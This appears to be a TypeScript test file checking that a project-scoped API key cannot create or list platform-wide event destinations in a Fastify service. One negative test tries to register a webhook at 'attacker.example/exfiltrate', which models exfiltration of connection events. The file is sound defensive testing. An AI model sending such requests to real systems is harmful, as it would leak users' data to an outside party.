import { ApplicationEventName } from '@inboxfm-connect/shared'
import { FastifyInstance, InjectOptions } from 'fastify'
import { StatusCodes } from 'http-status-codes'
import { mockAndSaveBasicSetupWithApiKey } from '../../../helpers/mocks'
import { createTestContext, TestContext } from '../../../helpers/test-context'
import { setupTestEnvironment, teardownTestEnvironment } from '../../../helpers/test-setup'

let app: FastifyInstance | null = null

beforeAll(async () => {
    app = await setupTestEnvironment()
})

afterAll(async () => {
    await teardownTestEnvironment()
})

/**
 * A Connect API key (`cak-`) is minted by a *project* admin and authenticates as a
 * SERVICE principal carrying `projectId`. `platformAdminOnly` routes are documented
 * as "owner of the platform only", and their SERVICE short-circuit exists because a
 * platform-wide `sk-` key *is* the platform's own credential — it says nothing about
 * a key bound to a single project. These tests pin the boundary: a project-scoped
 * credential must never reach a platform-level resource.
 */
describe('Project-scoped Connect API key vs platform-scoped routes', () => {
    function injectWithToken(token: string, opts: InjectOptions) {
        return app!.inject({
            ...opts,
            url: `/api${opts.url}`,
            headers: {
                authorization: `Bearer ${token}`,
                ...opts.headers,
            },
        })
    }

    async function mintProjectScopedConnectApiKey(ctx: TestContext): Promise<string> {
        const response = await ctx.post('/v1/connect-api-keys', {
            displayName: 'agent backend key',
            projectId: ctx.project.id,
        })
        expect(response?.statusCode).toBe(StatusCodes.CREATED)
        const value = response?.json().value as string
        expect(value.startsWith('cak-')).toBe(true)
        return value
    }

    it('denies a project-scoped Connect API key from creating a platform event destination', async () => {
        const ctx = await createTestContext(app!)
        const projectScopedKey = await mintProjectScopedConnectApiKey(ctx)

        const response = await injectWithToken(projectScopedKey, {
            method: 'POST',
            url: '/v1/event-destinations',
            payload: {
                url: 'https://attacker.example/exfiltrate',
                events: [ApplicationEventName.CONNECTION_UPSERTED],
            },
        })

        expect(response.statusCode).toBe(StatusCodes.FORBIDDEN)
    })

    it('denies a project-scoped Connect API key from listing platform event destinations', async () => {
        const ctx = await createTestContext(app!)
        const projectScopedKey = await mintProjectScopedConnectApiKey(ctx)

        const response = await injectWithToken(projectScopedKey, {
            method: 'GET',
            url: '/v1/event-destinations',
        })

        expect(response.statusCode).toBe(StatusCodes.FORBIDDEN)
    })

    it('still allows a platform-wide service key (no regression for sk- credentials)', async () => {
        const { mockApiKey } = await mockAndSaveBasicSetupWithApiKey()

        const response = await injectWithToken(mockApiKey.value, {
            method: 'POST',
            url: '/v1/event-destinations',
            payload: {
                url: 'https://example.com/platform-hook',
                events: [ApplicationEventName.CONNECTION_UPSERTED],
            },
        })

        expect(response.statusCode).toBe(StatusCodes.OK)
    })

    it('still allows the platform owner', async () => {
        const ctx = await createTestContext(app!)

        const response = await ctx.post('/v1/event-destinations', {
            url: 'https://example.com/platform-hook',
            events: [ApplicationEventName.CONNECTION_UPSERTED],
        })

        expect(response?.statusCode).toBe(StatusCodes.OK)
    })
})
